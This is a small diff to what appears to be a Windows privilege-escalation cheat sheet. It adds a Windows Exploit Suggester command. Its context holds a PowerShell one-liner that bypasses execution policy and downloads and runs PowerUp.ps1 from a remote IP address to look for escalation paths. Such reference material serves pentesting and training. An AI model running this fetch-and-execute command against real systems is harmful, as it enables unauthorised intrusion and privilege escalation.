@@ -687,6 +687,7 @@ Example:
 ```powershell
 powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.114.88.43:8181/PowerUp.ps1'); Invoke-AllChecks"
 python3 wes.py systeminfo.txt -e
+python3 wes.py systeminfo.txt --muc-lookup
 ```
 
 ---
